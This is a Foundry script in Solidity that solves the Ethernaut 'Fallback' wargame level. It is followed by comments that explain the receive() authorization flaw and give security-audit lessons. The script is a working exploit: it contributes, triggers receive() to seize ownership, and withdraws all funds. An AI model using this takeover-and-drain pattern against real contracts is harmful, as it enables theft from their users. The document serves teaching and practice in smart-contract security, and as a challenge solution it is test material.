// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "ethernaut/levels/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title FallbackSolver
 * @notice Simple script to solve the Fallback challenge
 * @dev Run with `forge script script/solutions/FallbackSolver.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
 */
contract FallbackSolver is Script {
    // Instance address - replace with your own if needed
    Fallback public fallbackInstance = Fallback(payable(0x982B5F7388eA04b1c47627cCd20FA437D0A5814e));

    function setUp() public {
    }

    function run() public {
        // Get player address from private key
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        
        console.log("Fallback instance address:", address(fallbackInstance));
        console.log("Player address:", player);
        
        vm.startBroadcast(privateKey);

        // Step 1: Contribute to get foothold
        console.log("Step 1: Contributing to get listed in contributions...");
        fallbackInstance.contribute{value: 0.0001 ether}();
        
        // Step 2: Trigger receive function to become owner
        console.log("Step 2: Triggering receive function to take ownership...");
        (bool success,) = address(fallbackInstance).call{value: 0.0001 ether}("");
        require(success, "Receive call failed");
        
        // Step 3: Verify player is now the owner
        console.log("New owner:", fallbackInstance.owner());
        
        // Step 4: Withdraw all funds
        console.log("Step 4: Withdrawing all funds...");
        fallbackInstance.withdraw();
        
        console.log("Challenge completed successfully!");
        
        vm.stopBroadcast();
    }
}

/*
 * VULNERABILITY EXPLANATION
 * -----------------------
 * The Fallback contract contains a critical authorization flaw in its `receive()` function:
 *
 * ```solidity
 * receive() external payable {
 *     require(msg.value > 0 && contributions[msg.sender] > 0);
 *     owner = msg.sender;
 * }
 * ```
 *
 * This function grants ownership with minimal requirements - just having made any previous 
 * contribution and sending some ETH - bypassing the expected ownership transfer path.
 *
 * EXPLOIT TECHNIQUE
 * -----------------------
 * 1. Call `contribute()` with a small amount of ETH (<0.001) to get listed in contributions mapping
 * 2. Send ETH directly to the contract address to trigger `receive()`
 * 3. Ownership is transferred to the attacker
 * 4. Call `withdraw()` to drain the funds
 *
 * SECURITY LESSONS
 * -----------------------
 * Special functions like `receive()` create alternative entry points that may bypass a contract's 
 * intended authorization flow. While the contract appears to require substantial contributions 
 * (>1000 ETH) to become owner, the `receive()` function provides an overlooked shortcut.
 *
 * Always audit all execution paths in your contract, with particular attention to fallback functions
 * that can be triggered through direct ETH transfers. Access control should be consistent across
 * all functions that modify critical state variables like ownership.
 */ 